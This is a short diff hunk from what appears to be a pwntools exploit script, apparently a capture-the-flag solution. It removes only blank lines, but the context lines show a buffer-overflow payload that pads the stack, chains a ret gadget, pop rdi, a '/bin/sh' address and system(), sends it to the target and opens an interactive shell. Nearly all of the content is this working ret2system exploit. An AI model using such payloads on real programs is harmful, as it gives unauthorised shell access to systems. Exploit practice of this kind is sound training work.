@@ -26,6 +26,4 @@ payload = "A"*0x10 + "B"*0x8
 payload += p64(ret)+p64(poprdi) + p64(binsh) + p64(system)
 p.sendlineafter("input:",payload)
 
-
-
 p.interactive()
